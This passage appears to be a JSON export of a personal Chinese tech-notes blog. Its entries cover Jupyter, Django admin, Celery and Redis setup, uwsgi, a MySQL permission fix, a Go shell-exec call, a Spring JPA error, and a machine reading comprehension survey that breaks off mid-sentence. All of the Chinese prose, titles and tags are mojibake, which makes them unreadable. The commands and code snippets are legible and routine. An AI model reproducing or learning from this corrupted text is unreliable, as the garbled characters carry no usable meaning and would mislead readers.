notebook","slug":"history/tech/59fb248229daf38b68d15486","date":"2017-11-02T01:58:26.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59fb248229daf38b68d15486/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59fb248229daf38b68d15486/","excerpt":"","text":"ç”Ÿæˆé…ç½®jupyter notebook --generate-config è®¾ç½®å¯†ç :jupyter notebook password å¯åŠ¨:nohup jupyter notebook --ip 0.0.0.0 --port 80 --allow-root --no-browser /root/workspace &amp;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"jquery æ‹–æ‹½æ’ä»¶","slug":"history/tech/59f931420e8491115f5314e2","date":"2017-11-01T02:28:18.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59f931420e8491115f5314e2/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59f931420e8491115f5314e2/","excerpt":"","text":"http://www.jq22.com/yanshi10850http://www.jq22.com/yanshi2615","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"sqllite å®¢æˆ·ç«¯","slug":"history/tech/59f9929c0e8491115f5314e5","date":"2017-10-31T21:23:40.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59f9929c0e8491115f5314e5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59f9929c0e8491115f5314e5/","excerpt":"","text":"http://sqlitestudio.one.pl/http://blog.csdn.net/shellching/article/details/7979969","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"Django admin åˆ›å»ºå·¥ç¨‹","slug":"history/tech/59f9852c0e8491115f5314e4","date":"2017-10-31T20:26:20.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59f9852c0e8491115f5314e4/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59f9852c0e8491115f5314e4/","excerpt":"","text":"ç”Ÿæˆå·¥ç¨‹å®‰è£…:pip install django åˆ›å»ºå·¥ç¨‹:django-admin.py startproject pykins åˆ›å»ºåº”ç”¨django-admin.py startapp app æ³¨å†Œ app åˆ°å·¥ç¨‹ï¼švim pykins/settings.py INSTALLED_APPS = [ 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'app' ] ç”Ÿæˆæ•°æ®åº“è¡¨å•python manage.py migrate åˆ›å»ºè¶…çº§ç”¨æˆ·python manage.py createsuperuser è¿è¡Œå·¥ç¨‹:python manage.py runserver migrate å’Œ makemigrations çš„åŒºåˆ«python manger.py makemigrations ç›¸å½“äº åœ¨è¯¥appä¸‹å»ºç«‹ migrationsç›®å½•ï¼Œå¹¶è®°å½•ä¸‹ä½ æ‰€æœ‰çš„å…³äº modes.py çš„æ”¹åŠ¨ï¼Œæ¯”å¦‚ 0001_initial.pyï¼Œ ä½†æ˜¯è¿™ä¸ªæ”¹åŠ¨è¿˜æ²¡æœ‰ä½œç”¨åˆ°æ•°æ®åº“æ–‡ä»¶ python manage.py migrate ç›´æ¥ä½œç”¨åˆ°æ•°æ®åº“ é‡åˆ°é—®é¢˜ æ— æ³•æ›´æ–°æ•°æ®åº“python manage.py makemigrations No changes detected è§£å†³:python manage.py makemigrations app_name â€˜WSGIRequestâ€™ object has no attribute â€˜userâ€™è¿™æ˜¯Djangoç‰ˆæœ¬çš„é—®é¢˜ï¼Œ1.10ä¹‹å‰ï¼Œä¸­é—´ä»¶çš„keyä¸ºMIDDLEWARE_CLASSES, 1.10ä¹‹åï¼Œä¸ºMIDDLEWAREã€‚è§£å†³:MIDDLEWARE = [ ..... ] æ”¹ä¸º:MIDDLEWARE_CLASSES = [ ..... ] å¢åŠ  bootstrap:bootstrap:pip install django-admin-bootstrapped INSTALLED_APPS = [ 'django_admin_bootstrapped', 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'app' ] bootstrap3:pip install django-bootstrap3 INSTALLED_APPS = [ 'django_admin_bootstrapped.bootstrap3', 'django_admin_bootstrapped', 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'app' ] æŠ¥é”™:ImportError: No module named bootstrap3 è§£å†³:INSTALLED_APPS = [ 'bootstrap3', 'django_admin_bootstrapped', 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'app' ] æ±‰åŒ–:å¢åŠ  django.middleware.locale.LocaleMiddlewareMIDDLEWARE_CLASSES = [ 'django.middleware.security.SecurityMiddleware', 'django.contrib.sessions.middleware.SessionMiddleware', 'django.middleware.common.CommonMiddleware', 'django.middleware.csrf.CsrfViewMiddleware', 'django.contrib.auth.middleware.AuthenticationMiddleware', 'django.contrib.messages.middleware.MessageMiddleware', 'django.middleware.clickjacking.XFrameOptionsMiddleware', 'django.middleware.locale.LocaleMiddleware', ] sqllite å®¢æˆ·ç«¯:ç›´æ¥æ‰“å¼€ django ç”Ÿæˆçš„ db.sqlite3 æ–‡ä»¶å³å¯http://blog.qianrushi.org/topic/59f9929c0e8491115f5314e5å‚è€ƒ:http://www.huangwenchao.com.cn/2014/02/django-tip-2.html ä½¿ç”¨django-celeryå®Œæˆå¼‚æ­¥ä»»åŠ¡pip install django-celery ä¿®æ”¹ settings.py:import djcelery djcelery.setup_loader() BROKER_URL = 'django://' # å‘Šè¯‰Celeryä½¿ç”¨Djangoé¡¹ç›®ä½œä¸ºbroker # Application definition INSTALLED_APPS = [ 'bootstrap3', 'django_admin_bootstrapped', 'django.contrib.admin', 'django.contrib.auth', 'django.contrib.contenttypes', 'django.contrib.sessions', 'django.contrib.messages', 'django.contrib.staticfiles', 'app', 'djcelery', 'kombu.transport.django', ] ç”Ÿæˆæ•°æ®è¡¨:python manage.py migrate ä¸€ä¸ªtaskå°±æ˜¯ä¸€ä¸ªPyhton function. ä½†Celeryéœ€è¦çŸ¥é“è¿™ä¸€functionæ˜¯task,å½“settings.pyä¸­çš„ djcelery.setup_loader() è¿è¡Œæ—¶,Celeryä¾¿ä¼šæŸ¥çœ‹æ‰€æœ‰INSTALLED_APPSä¸­appç›®å½•ä¸­çš„tasks.pyæ–‡ä»¶,æ‰¾åˆ°æ ‡è®°ä¸ºtaskçš„function, å¹¶å°†å®ƒä»¬æ³¨å†Œä¸ºcelery taskã€‚å°†functionæ ‡æ³¨ä¸ºtaskå¹¶ä¸ä¼šå¦¨ç¢ä»–ä»¬çš„æ­£å¸¸æ‰§è¡Œ. ä½ è¿˜æ˜¯å¯ä»¥åƒå¹³æ—¶é‚£æ ·è°ƒç”¨å®ƒ: z = add(1, 2)ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨celeryè‡ªå¸¦çš„è£…é¥°å™¨decorator: @task. åœ¨django appç›®å½•ä¸­åˆ›å»ºtaske.py:from celery import task @task() def add(x, y): return x + y Celeryä¼šå°†taskåŠ å…¥åˆ°queueä¸­, å¹¶é©¬ä¸Šè¿”å›. è€Œåœ¨ä¸€æ—å¾…å‘½çš„workerçœ‹åˆ°è¯¥taskå,ä¾¿ä¼šæŒ‰ç…§è®¾å®šæ‰§è¡Œå®ƒ, å¹¶å°†ä»–ä»queueä¸­ç§»é™¤. è€Œworkeråˆ™ä¼šæ‰§è¡Œä»¥ä¸‹ä»£ç :import app.tasks.add app.tasks.add(2, 2) å¯åŠ¨taskæ‰“å¼€æ–°çš„terminal, å¹¶åˆ‡æ¢åˆ°djangoé¡¹ç›®ç›®å½•:$ python manage.py shell &gt;&gt;&gt; from app.tasks import add &gt;&gt;&gt; add.delay(2, 2) æ­¤æ—¶, ä½ å¯ä»¥åœ¨workerçª—å£ä¸­çœ‹åˆ°workeræ‰§è¡Œè¯¥task åœ¨ web è¯·æ±‚ä¸­æ‰§è¡Œ# views.py from app.tasks import do_something_with_form_data def view(request): form = SomeForm(request.POST) if form.is_valid(): data = form.cleaned_data # Schedule a task to process the data later do_something_with_form_data.delay(data) return render_to_response(...) # tasks.py @task def do_something_with_form_data(data): call_slow_web_service(data['user'], data['text'], ...) Eager æ¨¡å¼å¦‚æœåœ¨settings.pyè®¾ç½®:CELERY_ALWAYS_EAGER = True é‚£ä¹ˆCeleryä¾¿ä»¥eageræ¨¡å¼è¿è¡Œ, åˆ™taskä¾¿ä¸éœ€è¦åŠ delayè¿è¡Œ:# è‹¥å¯ç”¨eageræ¨¡å¼, åˆ™ä»¥ä¸‹ä¸¤è¡Œä»£ç ç›¸åŒ add.delay(2, 2) add(2, 2) å®šæ—¶ä»»åŠ¡è¿˜æœ‰ä¸€ç§Celeryçš„å¸¸ç”¨æ¨¡å¼ä¾¿æ˜¯æ‰§è¡Œå®šæœŸä»»åŠ¡. æ‰§è¡Œå®šæœŸä»»åŠ¡æ—¶,Celeryä¼šé€šè¿‡celerybeatè¿›ç¨‹æ¥å®Œæˆ. Celerybeatä¼šä¿æŒè¿è¡Œ,ä¸€æ—¦åˆ°äº†æŸä¸€å®šæœŸä»»åŠ¡éœ€è¦æ‰§è¡Œæ—¶,Celerybeatä¾¿å°†å…¶åŠ å…¥åˆ°queueä¸­.ä¸åƒworkerè¿›ç¨‹, Celerybeatåªæœ‰éœ€è¦ä¸€ä¸ªå³å¯.å¯åŠ¨Celerybeat:python manage.py celery beat ä½¿Celeryè¿è¡Œå®šæœŸä»»åŠ¡çš„æ–¹å¼æœ‰å¾ˆå¤šç§, æˆ‘ä»¬å…ˆçœ‹ç¬¬ä¸€ç§, å°†å®šæœŸä»»åŠ¡å‚¨å­˜åœ¨djangoæ•°æ®åº“ä¸­.å³ä½¿æ˜¯åœ¨djangoå’Œceleryéƒ½è¿è¡Œçš„çŠ¶æ€, è¿™ä¸€æ–¹å¼ä¹Ÿå¯ä»¥è®©æˆ‘ä»¬æ–¹ä¾¿çš„ä¿®æ”¹å®šæœŸä»»åŠ¡.æˆ‘ä»¬åªéœ€è¦è®¾ç½®settings.pyä¸­çš„ä¸€é¡¹ä¾¿èƒ½å¼€å¯è¿™ä¸€æ–¹å¼:# settings.py CELERYBEAT_SCHEDULER = 'djcelery.schedulers.DatabaseScheduler' Name: è¿™ä¸€å®šæœŸä»»åŠ¡çš„æ³¨å†Œå Task (registered): å¯ä»¥é€‰æ‹©æ‰€æœ‰å·²ç»æ³¨å†Œçš„taskä¹‹ä¸€, ä¾‹å¦‚å‰é¢çš„add function Task (custom): taskçš„å…¨å, ä¾‹å¦‚ app.tasks.add, ä½†æœ€å¥½è¿˜æ˜¯ç”¨ä»¥ä¸Šé¡¹ Enabled: æ˜¯å¦å¼€å¯è¿™ä¸€å®šæœŸä»»åŠ¡ Interval: å®šæœŸä»»åŠ¡çš„é—´éš”æ—¶é—´, ä¾‹å¦‚æ¯éš”5åˆ†é’Ÿ Crontab: å¦‚æœå¸Œæœ›taskåœ¨æŸä¸€ç‰¹å®šæ—¶é—´è¿è¡Œ, åˆ™ä½¿ç”¨Unixä¸­çš„Crontabä»£æ›¿interval Arguments: ç”¨äºä¼ å‚æ•°åˆ°taskä¸­ Execution Options: æ›´é«˜çº§çš„è®¾ç½®, åœ¨æ­¤ä¸è¯¦ç»†è¯´æ˜, è¯·æŸ¥çœ‹celeryå®˜æ–¹æ–‡æ¡£ worker å‚æ•°æŸ¥çœ‹queueå› ä¸ºæˆ‘ä»¬ä½¿ç”¨äº†djangoä½œä¸ºbroker, queueå‚¨å­˜åœ¨djangoçš„æ•°æ®åº“ä¸­. è¿™å°±æ„å‘³ç€æˆ‘ä»¬å¯ä»¥é€šè¿‡django adminæŸ¥çœ‹è¯¥queue:# admin.py from django.contrib import admin from kombu.transport.django import models as kombu_models admin.site.register(kombu_models.Message) å®‰è£…å¹¶å¯åŠ¨flower(é»˜è®¤ä¼šå¯åŠ¨ä¸€ä¸ªwebserver,ç«¯å£ä¸º5555):pip install flower python manage.py celery flower ä½¿ç”¨ Redispip install redis è®¾ç½® Redis æ•°æ®åº“çš„ä½ç½®:BROKER_URL = â€˜redis://localhost:6379/0â€™URL çš„æ ¼å¼ä¸º:redis://password@hostname:port/db_number åœ¨ Redis ä¸­å­˜å‚¨ä»»åŠ¡çš„çŠ¶æ€å’Œè¿”å›å€¼:CELERY_RESULT_BACKEND = 'redis://localhost:6379/0' ä½¿ç”¨ celery beat,æ³¨é‡Š djcelery.schedulers.DatabaseScheduler , å› ä¸ºé»˜è®¤ä¸º celery.beat:PersistentScheduler.# CELERYBEAT_SCHEDULER = 'djcelery.schedulers.DatabaseScheduler' ä½¿ç”¨ uwsgi æ ·å¼ä¸¢å¤± ----æœªè§£å†³STATIC_ROOT = BASE_DIR + '/static/' STATIC_URL = '/static/' STATICFILES_DIRS = [ os.path.join(BASE_DIR, &quot;static&quot;), ] æ‰§è¡Œpython manage.py collectstatic #æ”¶é›†Djangoé¡¹ç›®ä¸­æ‰€æœ‰æ¶‰åŠåˆ°çš„é™æ€èµ„æºï¼Œæ”¾åˆ° STATIC_ROOT ä¸­ å¯åŠ¨uwsgi --http :9911 --chdir /root/pykins^C--wsgi-file /root/pykins/pykins/wsgi.py","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"kafka æƒå¨æŒ‡å—ç¿»è¯‘","slug":"history/tech/59f97ad90e8491115f5314e3","date":"2017-10-31T19:42:17.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59f97ad90e8491115f5314e3/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59f97ad90e8491115f5314e3/","excerpt":"","text":"kafka æƒå¨æŒ‡å—ç¿»è¯‘ä½œè€…åšå®¢ä½œè€… github","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"autojump ä¸€é”®ç›´è¾¾ç›®å½•","slug":"history/tech/59f7cb199c97788655e00f20","date":"2017-10-31T01:00:09.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59f7cb199c97788655e00f20/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59f7cb199c97788655e00f20/","excerpt":"","text":"autojump ä¸€é”®ç›´è¾¾ç›®å½•ï¼šsudo apt-get install autojump","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"mysql æ— æ³•åˆ é™¤æ•°æ®åº“ ERROR 13","slug":"history/tech/59f68e2366a84c463d4416da","date":"2017-10-30T02:27:47.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59f68e2366a84c463d4416da/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59f68e2366a84c463d4416da/","excerpt":"","text":"è§£å†³æ–¹æ³•ï¼šsudo chown -R mysql:mysql /var/lib/mysql","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å¸¸ç”¨å›¾åºŠ","slug":"history/tech/59f6f5d7490e8b51096edd7b","date":"2017-10-29T21:50:15.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59f6f5d7490e8b51096edd7b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59f6f5d7490e8b51096edd7b/","excerpt":"","text":"qchan","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å¸¸ç”¨å‡ ç§wiki","slug":"history/tech/59f6f591490e8b51096edd7a","date":"2017-10-29T21:49:05.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59f6f591490e8b51096edd7a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59f6f591490e8b51096edd7a/","excerpt":"","text":"dokuwiki","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"go æ‰§è¡Œå‘½ä»¤è¡Œ","slug":"history/tech/59f6c29766a84c463d4416dc","date":"2017-10-29T18:11:35.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59f6c29766a84c463d4416dc/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59f6c29766a84c463d4416dc/","excerpt":"","text":"go æ‰§è¡Œå‘½ä»¤è¡Œ:cmd=exec.Command(&quot;/bin/sh&quot;, &quot;-c&quot;,binPath)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"windowsä¸‹å¸¸ç”¨ shell å·¥å…·åŒ…","slug":"history/tech/59f6c1ba66a84c463d4416db","date":"2017-10-29T18:07:54.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59f6c1ba66a84c463d4416db/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59f6c1ba66a84c463d4416db/","excerpt":"","text":"windowsä¸‹é›†æˆlinuxå¸¸ç”¨å·¥å…·åŒ…","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å·´è¥¿å°ä¼™","slug":"history/music/59f158d566a84c463d4416d3","date":"2017-10-26T03:39:01.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/music/59f158d566a84c463d4416d3/","link":"","permalink":"https://wangxiuwen.github.io/history/music/59f158d566a84c463d4416d3/","excerpt":"","text":"https://www.guitarrarockonline.com.br/tecnica/","categories":[{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/categories/%E9%9F%B3%E4%B9%90/"}],"tags":[{"name":"music","slug":"music","permalink":"https://wangxiuwen.github.io/tags/music/"},{"name":"éŸ³ä¹","slug":"éŸ³ä¹","permalink":"https://wangxiuwen.github.io/tags/%E9%9F%B3%E4%B9%90/"}],"author":"wangxiuwen"},{"title":"Spring boot jpa ManyToOne å¤šå¯¹ä¸€æŸ¥è¯¢é”™é—®æ’æŸ¥ã€‚","slug":"history/tech/59f1afeb66a84c463d4416d8","date":"2017-10-25T21:50:35.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59f1afeb66a84c463d4416d8/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59f1afeb66a84c463d4416d8/","excerpt":"","text":"å…³è”æŸ¥è¯¢å±äºåªè¯»è¡Œä¸ºï¼Œé»˜è®¤æƒ…å†µä¸‹@JoinColumn ä¸­ insertable å’Œ updatable æ˜¯true æ”¯æŒæ–°å¢æˆ–æ›´æ–°åˆ—è¡¨ã€‚åªè¯»æŸ¥è¯¢è¯·è®¾ç½®ä¸ºfalseï¼Œå¦åˆ™å¯åŠ¨ä¸ºæŠ¥é”™Caused by: org.hibernate.MappingException: Repeated column in mapping for entity: cn.**.RcustomerModelDimensionAttribute column: attribute_code (should be mapped with insert=&quot;false&quot; update=&quot;false&quot;)","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"SpringbootJpa","slug":"SpringbootJpa","permalink":"https://wangxiuwen.github.io/tags/SpringbootJpa/"}],"author":"baipeng"},{"title":"æ•™å­¦æœºå™¨æ€è€ƒï¼Œç†æ€§å’Œæ²Ÿé€šã€‚","slug":"history/tech/59f17a6366a84c463d4416d7","date":"2017-10-25T18:02:11.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59f17a6366a84c463d4416d7/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59f17a6366a84c463d4416d7/","excerpt":"","text":"http://www.maluuba.com/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"æœºå™¨å­¦ä¹ ","slug":"æœºå™¨å­¦ä¹ ","permalink":"https://wangxiuwen.github.io/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"},{"name":"å¾®è½¯","slug":"å¾®è½¯","permalink":"https://wangxiuwen.github.io/tags/%E5%BE%AE%E8%BD%AF/"},{"name":"æ·±åº¦å­¦ä¹ ","slug":"æ·±åº¦å­¦ä¹ ","permalink":"https://wangxiuwen.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"}],"author":"baipeng"},{"title":"æ•™æœºå™¨å­¦ä¹ é˜…è¯»","slug":"history/tech/59f1799b66a84c463d4416d6","date":"2017-10-25T17:58:51.000Z","updated":"2020-11-29T01:42:08.763Z","comments":true,"path":"history/tech/59f1799b66a84c463d4416d6/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/59f1799b66a84c463d4416d6/","excerpt":"","text":"æœºå™¨å­¦ä¼šé˜…è¯»å°†æ˜¯äººå·¥æ™ºèƒ½åœ¨å¤„ç†å’Œç†è§£äººç±»è¯­è¨€è¿›ç¨‹ä¸­ä¸€ä¸ªé‡Œç¨‹ç¢‘å¼çš„äº‹ä»¶ï¼Œæ˜¯ä¸€ä¸ªçœŸæ­£AIå¿…é¡»è¾¾åˆ°çš„æ ‡å‡†ã€‚æœ€è¿‘ä¸€å®¶å«åšMaluubaçš„ç§‘æŠ€å…¬å¸ï¼Œå·ç§°å¼€å‘äº†ç›®å‰æœ€é¢†å…ˆçš„æœºå™¨é˜…è¯»ç†è§£ç³»ç»ŸEpiReader[10]ï¼Œæˆä¸ºäº†ä¸šç•Œçš„é¢†è·‘è€…ï¼Œä¹Ÿè¢«åª’ä½“ç››èµã€‚æœ¬æ–‡æ˜¯ä¸€ç¯‡æœºå™¨é˜…è¯»ç†è§£çš„ç»¼è¿°æ–‡ç« ï¼Œç³»ç»Ÿåœ°æ€»ç»“å’Œå¯¹æ¯”ä¸€ä¸‹æœ€è¿‘é˜…è¯»è¿‡çš„ç›¸å…³paperã€‚é—®é¢˜æè¿°é¦–å…ˆå®šä¹‰ä¸‹æœºå™¨é˜…è¯»ç†è§£é—®é¢˜çš„æ•°å­¦æ¨¡å‹ã€‚é—®é¢˜å¯ä»¥è¡¨è¿°ä¸ºä¸€ä¸ªä¸‰å…ƒç»„(d,q,a)ï¼Œè¿™é‡Œdæ˜¯æŒ‡åŸæ–‡documentï¼Œqæ˜¯æŒ‡é—®é¢˜queryæˆ–è€…questionï¼ˆä¸åŒçš„paperå¯èƒ½ç§°å‘¼ä¸åŒï¼Œä½†æŒ‡çš„æ˜¯åŒä¸€å›äº‹ï¼‰ï¼Œaæ˜¯answerï¼Œå³é—®é¢˜çš„ç­”æ¡ˆã€‚è¿™ä¸ªç­”æ¡ˆæ˜¯æ¥è‡ªä¸€ä¸ªå›ºå®šå¤§å°çš„è¯æ±‡è¡¨Aä¸­çš„ä¸€ä¸ªè¯ã€‚æˆ‘ä»¬è¦è§£å†³çš„é—®é¢˜å°±å˜æˆäº†ï¼šç»™å®šä¸€ä¸ªdocument-queryå¯¹(d,q)ï¼Œä»Aä¸­æ‰¾åˆ°æœ€åˆé€‚çš„ç­”æ¡ˆaã€‚ç»å¸¸å¬åˆ°è¿™ä¹ˆä¸€å¥è¯ï¼Œæ²¡æœ‰åˆ†ç±»è§£å†³ä¸äº†çš„é—®é¢˜ã€‚è™½ç„¶æœ‰ä¸€ç‚¹å¤¸å¼ ï¼Œä½†è¿™ä¸ªé—®é¢˜æ˜¯ä¸€ä¸ªå…¸å‹çš„å¤šåˆ†ç±»é—®é¢˜ï¼Œé¢„æµ‹å€™é€‰åˆ—è¡¨ä¸­æ¯ä¸ªwordæˆ–è€…entityçš„æ¡ä»¶æ¦‚ç‡ï¼Œæœ€å¤§çš„é‚£ä¸ªå°±æ˜¯æ­£ç¡®ç­”æ¡ˆã€‚å…¶å®å¾ˆå¤šé—®é¢˜ä¹Ÿéƒ½æ˜¯è¿™æ ·ï¼Œå°¤å…¶æ˜¯åœ¨ç”Ÿæˆé—®é¢˜ä¸Šï¼Œç»™å®šcontextï¼Œæ¥predictæ¯ä¸€ä¸ªwordçš„æ¦‚ç‡ã€‚è¿™é‡Œä¸åŒçš„paperåœ¨è¯æ±‡è¡¨Aä¸­æœ‰äº›ä¸åŒï¼Œæœ‰çš„paperå°†Aå®šä¹‰ä¸ºdocumentå’Œqueryä¸­çš„æ‰€æœ‰è¯ï¼Œè€Œæœ‰çš„å°†Aå®šä¹‰ä¸ºæ‰€æœ‰çš„entityï¼Œè€Œæœ‰çš„å°†ä¼šé™„å¸¦ä¸€ä¸ªåŒ…æ‹¬æ­£ç¡®ç­”æ¡ˆåœ¨å†…çš„10ä¸ªå€™é€‰ç­”æ¡ˆï¼Œå¹¶ä¸”æ¯ä¸ªç­”æ¡ˆçš„è¯æ€§éƒ½ä¸€è‡´ã€‚è¯­æ–™è¯­æ–™å¯¹äºNLPçš„ç ”ç©¶æœ‰ç€ååˆ†é‡è¦çš„åŸºç¡€ä½œç”¨ï¼Œå°¤å…¶æ˜¯å¤§è§„æ¨¡çš„è¯­æ–™ä¸ºç ”ç©¶ç›¸å…³ä»»åŠ¡å¸¦æ¥äº†é©å‘½æ€§çš„å˜åŒ–ã€‚å‰äº›å¹´çš„è¯­æ–™éƒ½éå¸¸å°ï¼Œæ¯”å¦‚MCTestã€‚ä»2015å¹´å¼€å§‹ï¼Œå‡ºç°äº†ä¸¤å¤§ä¸»æµçš„å¤§å‹æ•°æ®é›†ã€‚1ã€CNN/Daily 